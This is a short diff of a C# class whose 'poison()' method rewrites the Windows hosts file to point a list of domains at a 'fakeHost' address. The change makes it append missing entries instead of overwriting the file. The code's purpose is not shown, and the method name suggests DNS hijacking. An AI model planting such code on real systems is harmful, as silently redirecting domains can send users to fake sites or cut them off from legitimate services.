@@ -11,18 +11,32 @@
             this.hosts.AddRange(hosts);
         }
 
-        /*
-         * Totally overrides hosts file, not always appropriate
-         */
         public void poison()
         {
             string localDnsFile = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), "drivers/etc/hosts");
             List<string> hostsFileFormattedHosts = new List<string>();
-            foreach(var host in hosts)
+            string[] theirHosts = File.ReadAllLines(localDnsFile);
+            foreach(var myHost in hosts)
             {
-                hostsFileFormattedHosts.Add(fakeHost + "    " + host);
+                bool hostPresented = false;
+                foreach(var theirHost in theirHosts)
+                {
+                    if (theirHost.Contains(myHost))
+                    {
+                        hostPresented = true;
+                        break;
+                    }
+                }
+                if (!hostPresented)
+                {
+                    hostsFileFormattedHosts.Add(fakeHost + "    " + myHost);
+                } 
             }
-            File.WriteAllLines(localDnsFile, hostsFileFormattedHosts);
+            if (hostsFileFormattedHosts.Count > 0)
+            {
+                File.AppendAllText(localDnsFile, "\n");
+                File.AppendAllLines(localDnsFile, hostsFileFormattedHosts);
+            }
         }
     }
 }
